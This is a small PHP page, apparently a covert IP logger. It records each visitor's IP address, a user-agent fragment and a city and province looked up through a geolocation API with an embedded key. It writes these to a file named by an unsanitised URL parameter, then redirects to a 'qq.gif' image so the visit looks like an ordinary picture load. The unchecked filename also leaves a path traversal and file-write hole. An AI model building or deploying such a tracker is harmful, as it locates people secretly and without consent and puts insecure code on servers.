<!DOCTYPE html>
<html>
<body>
<?php
$user_online = $_GET['time'].".txt";
$uip=getip();
$str=$_SERVER['HTTP_USER_AGENT'];
$ua=f3($str);
$file="file/".$user_online;
$myfile = fopen($file, "a") or die("Unable to open file!");
$api="https://restapi.amap.com/v3/ip?output=json&key=57dc982b0ae7d9bd37923932da1301f6&ip=";
$ad=file_get_contents($api.$uip);
$adjson=json_decode($ad,true);
$pro=$adjson['province'];
$city=$adjson['city'];
$txt =$uip.",".$ua.",".$pro.$city."@";
fwrite($myfile, $txt);
fclose($myfile);
echo $txt;
header("location:"."http://111.67.205.74/qq.gif");
function getip() {
if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
$ip = getenv("HTTP_CLIENT_IP");
} else
if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) {
$ip = getenv("HTTP_X_FORWARDED_FOR");
} else
if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) {
$ip = getenv("REMOTE_ADDR");
} else
if (isset ($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) {
$ip = $_SERVER['REMOTE_ADDR'];
} else {
$ip = "unknown";
}
return ($ip);
}
function f3($str)
{
preg_match('/(\([^\)]*\))/', $str, $matches);
return $matches[1];
}
?>
</body>
</html>
